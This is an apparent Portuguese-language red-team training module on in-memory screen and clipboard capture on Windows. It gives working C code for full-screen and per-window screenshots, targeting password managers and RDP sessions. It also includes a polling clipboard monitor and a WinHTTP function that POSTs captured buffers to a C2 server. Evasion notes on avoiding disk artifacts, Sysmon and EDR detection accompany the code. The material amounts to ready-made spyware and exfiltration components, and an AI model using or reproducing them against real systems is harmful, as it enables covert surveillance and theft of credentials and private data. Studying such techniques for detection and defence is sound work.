---
title: "In-Memory Capture"
---

# 07. In-Memory Capture (Screenshots, Clipboard)

## Sem Tocar Disco

Ferramentas clássicas (Snippit, PrintScreen) gravam em disco — arquivos detectáveis. Captura direto pra buffer em memória + exfil sobre canal C2 evita três coisas: forensics em disco, scan AV de PNG/BMP em pasta suspeita, e Sysmon Event 11 (file create) em path não-padrão. Usuário frequentemente tem dado sensível aberto: credencial em sessão browser, RDP, OneNote, Outlook.

---

## Pipeline GDI Direto Pra Memória

### Screenshot In-Memory Pipeline

1. `GetDC(NULL)` — Device Context da tela inteira (HDC do desktop).
2. `CreateCompatibleDC(hdc)` — DC em memória.
3. `CreateCompatibleBitmap(hdc, cx, cy)` — bitmap RGB do tamanho da tela.
4. `SelectObject(hdcMem, hBitmap)` — vincular bitmap ao DC memória.
5. `BitBlt(hdcMem, 0, 0, cx, cy, hdc, 0, 0, SRCCOPY)` — blit pixels da tela para bitmap.
6. `GetDIBits` — extrair raw bytes do bitmap para buffer.

Resultado: buffer com pixels brutos em RGB/BGR. Encodar para PNG/JPG via GDI+ ou wuffs/stb_image_write, ou enviar raw via C2.

### Clipboard Capture In-Memory

1. `OpenClipboard(NULL)`.
2. `GetClipboardData(CF_UNICODETEXT)` — handle para string.
3. `GlobalLock(hData)` — pointer para string.
4. Copiar para buffer próprio.
5. `GlobalUnlock` + `CloseClipboard`.

Pode capturar também:
- `CF_HDROP` — listas de arquivos copiados.
- `CF_BITMAP` / `CF_DIB` — imagens copiadas.
- `CF_HTML` — HTML formatado.

---

## Na Prática

### 1. Screenshot Multi-Monitor Direto Para PNG em Buffer

```c
#include <windows.h>
#include <gdiplus.h>
#include <objidl.h>
#pragma comment(lib, "gdiplus")

using namespace Gdiplus;

// Helper: encoder CLSID para PNG
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

BOOL CaptureScreenToMemory(PBYTE* ppOut, DWORD* pSize) {
    GdiplusStartupInput gpsi;
    ULONG_PTR gpToken;
    GdiplusStartup(&gpToken, &gpsi, NULL);

    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x  = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y  = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp  = CreateCompatibleBitmap(hdcScreen, cx, cy);
    HGDIOBJ hOld  = SelectObject(hdcMem, hBmp);

    BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, x, y, SRCCOPY);

    // GDI+ Bitmap from HBITMAP
    Bitmap* pBmp = new Bitmap(hBmp, NULL);

    // Encode para stream de memória
    IStream* pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);

    CLSID clsidPng;
    GetEncoderClsid(L"image/png", &clsidPng);
    pBmp->Save(pStream, &clsidPng, NULL);

    // Ler stream para buffer
    HGLOBAL hGlobal;
    GetHGlobalFromStream(pStream, &hGlobal);
    SIZE_T sz = GlobalSize(hGlobal);
    PVOID pMem = GlobalLock(hGlobal);
    *ppOut = (PBYTE)malloc(sz);
    memcpy(*ppOut, pMem, sz);
    *pSize = (DWORD)sz;
    GlobalUnlock(hGlobal);

    // Cleanup
    pStream->Release();
    delete pBmp;
    SelectObject(hdcMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    GdiplusShutdown(gpToken);
    return TRUE;
}
```

Buffer `*ppOut` contém PNG pronto para transmissão via C2. Nenhum arquivo criado em disco.

### 2. Clipboard Monitor

```c
#include <windows.h>
#include <stdio.h>

void MonitorClipboard() {
    HANDLE hClip = NULL;
    DWORD dwSeq = GetClipboardSequenceNumber();

    while (TRUE) {
        DWORD dwNew = GetClipboardSequenceNumber();
        if (dwNew == dwSeq) { Sleep(500); continue; }
        dwSeq = dwNew;

        if (!OpenClipboard(NULL)) { Sleep(100); continue; }

        // Texto Unicode
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            WCHAR* pText = (WCHAR*)GlobalLock(hData);
            if (pText) {
                wprintf(L"[CLIP] %s\n", pText);
                GlobalUnlock(hData);
            }
        }

        // Imagem (CF_DIB)
        hData = GetClipboardData(CF_DIB);
        if (hData) {
            SIZE_T sz = GlobalSize(hData);
            PVOID pBmp = GlobalLock(hData);
            // Enviar bytes via C2
            printf("[CLIP] Image %zu bytes\n", sz);
            GlobalUnlock(hData);
        }

        CloseClipboard();
        Sleep(500);
    }
}
```

`GetClipboardSequenceNumber()` muda a cada nova cópia → polling eficiente sem busy-loop.

---

## Capture de Janelas Específicas

Capturar janela específica (ex: KeePass, 1Password, RDP session) em vez da tela inteira:

```c
BOOL CaptureWindow(HWND hWnd, PBYTE* ppOut, DWORD* pSize) {
    RECT rc;
    GetWindowRect(hWnd, &rc);
    int cx = rc.right  - rc.left;
    int cy = rc.bottom - rc.top;

    HDC hdcWnd = GetWindowDC(hWnd);   // captura inclusive bordas/titlebar
    HDC hdcMem = CreateCompatibleDC(hdcWnd);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcWnd, cx, cy);
    SelectObject(hdcMem, hBmp);

    // PrintWindow = mais confiável que BitBlt para janelas minimizadas
    PrintWindow(hWnd, hdcMem, PW_RENDERFULLCONTENT);

    // [...] encode para PNG via GDI+ stream
    ReleaseDC(hWnd, hdcWnd);
    return TRUE;
}

// Encontrar janela por título parcial
HWND FindWindowByTitle(LPCWSTR pTitle) {
    HWND hWnd = NULL;
    do {
        hWnd = FindWindowExW(NULL, hWnd, NULL, NULL);
        WCHAR szTitle[256];
        GetWindowTextW(hWnd, szTitle, 256);
        if (wcsstr(szTitle, pTitle)) return hWnd;
    } while (hWnd);
    return NULL;
}
```

`PrintWindow(PW_RENDERFULLCONTENT)` funciona mesmo para janelas fora da área visível (minimizadas ou em monitor virtual).

---

## Integração C2 — Exfil Sem Arquivo

```c
// Buffer PNG pronto → HTTP POST via WinHTTP
#include <winhttp.h>
#pragma comment(lib, "winhttp")

void ExfilBuffer(PBYTE pData, DWORD dwSize, LPCWSTR pTarget) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      NULL, NULL, 0);
    HINTERNET hConn = WinHttpConnect(hSession, pTarget, 443, 0);
    HINTERNET hReq  = WinHttpOpenRequest(hConn, L"POST", L"/upload",
                                          NULL, WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       pData, dwSize, dwSize, 0);
    WinHttpReceiveResponse(hReq, NULL);
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSession);
}
```

---

## OPSEC

- **GetDC(NULL)** = DC do Desktop → hookável por EDR como suspeito em processos background.
- **PrintWindow** gera mensagem `WM_PRINT` para janela alvo — pode ser detectada por aplicativos que monitoram mensagens window.
- **GDI+ Init** carrega `gdiplus.dll` — novo load visível em Sysmon 7.
- **Alternativa lower-API**: `NtGdiCreateBitmap`/DXGI Desktop Duplication (mais moderno, mais furtivo).
- **DXGI Desktop Duplication**: DirectX 11 API para captura de desktop — maior performance, menos IOCs.

```c
// DXGI Desktop Duplication — skeleton
IDXGIOutputDuplication* pDupl;
pDxgiOutput->DuplicateOutput(pD3DDevice, &pDupl);
pDupl->AcquireNextFrame(500, &frameInfo, &pDesktopResource);
// frameInfo.LastPresentTime: só captura quando frame muda
```

## Módulos Relacionados

`03_credenciais_windows.md` cobre exfiltração de credenciais da memória via LSASS e KeePass — o mesmo princípio de operar inteiramente em RAM sem artefatos em disco. `06_network_recon_e_discovery.md` discute canais de saída e pivotamento relevantes para o exfil do buffer PNG via WinHTTP. ATT&CK T1113 (Screen Capture) e T1115 (Clipboard Data) mapeiam as técnicas desta nota.
